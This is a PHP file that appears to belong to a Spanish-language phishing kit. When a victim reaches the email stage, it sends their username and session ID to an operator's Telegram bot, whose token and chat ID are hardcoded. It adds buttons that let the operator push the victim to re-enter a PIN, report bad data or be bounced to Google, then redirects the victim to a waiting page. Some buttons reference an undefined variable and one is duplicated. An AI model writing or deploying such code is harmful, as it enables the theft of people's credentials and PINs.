<?php
session_start();

$id_sesion = isset($_SESSION['usuario_id']) ? $_SESSION['usuario_id'] : '';

if (!empty($id_sesion)) {
    $ruta_json = "sesiones/{$id_sesion}.json";

    if (file_exists($ruta_json)) {
        $datos = json_decode(file_get_contents($ruta_json), true);

        // Evitar duplicar la notificación si el usuario recarga
        if (!isset($datos['notificado_correo']) || $datos['notificado_correo'] !== true) {

            $token = "9156419748:AAFXdu2ORQoLuvGXuISZ9xfxEfdeEUVgRBw";
            $chat_id = "8166259970";

            $mensaje = "📧 ¡EL USUARIO PASÓ A LA ETAPA DE CORREO!\n\n";
            $mensaje .= "🆔 ID SESIÓN: {$id_sesion}\n";
            $mensaje .= "👤 USUARIO: {$datos['usuario']}\n\n";
            $mensaje .= "Seleccione la acción para el navegador del alumno:";

            // Botones de control para esta fase
            $botones = [
                'inline_keyboard' => [
                    [
                        ['text' => '⚠️ PIN Incorrecto', 'callback_data' => "redirigir|{$id_sesion}|pin_malo"],
                        ['text' => '🚪 Sacar a Google', 'callback_data' => "redirigir|{$id_sesion}|sacar_google"],
                        ['text' => '❌ Datos Malos', 'callback_data' => "redirigir|{$id_transmision}|datos_malos"],
                        ['text' => '🔑 Pedir PIN', 'callback_data' => "redirigir|{$id_transmision}|pedir_pin"],
                        ['text' => '📧 Mandar a Correo', 'callback_data' => "redirigir|{$id_sesion}|correo"],
                        ['text' => '⚠️ PIN Incorrecto', 'callback_data' => "redirigir|{$id_sesion}|pin_malo"]                       
                    ]
                ]
            ];

            $payload = [
                'chat_id' => $chat_id,
                'text' => $mensaje,
                'parse_mode' => 'Markdown',
                'reply_markup' => json_encode($botones)
            ];

            $ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
            curl_exec($ch);
            curl_close($ch);

            // Actualizar estado en el JSON
            $datos['estado'] = 'pendiente_correo';
            $datos['notificado_correo'] = true;
            file_put_contents($ruta_json, json_encode($datos));
        }
    }
}

// Redirección inmediata a la pantalla visual con escucha activa
header("Location: noautorizado.php");
exit();
?>
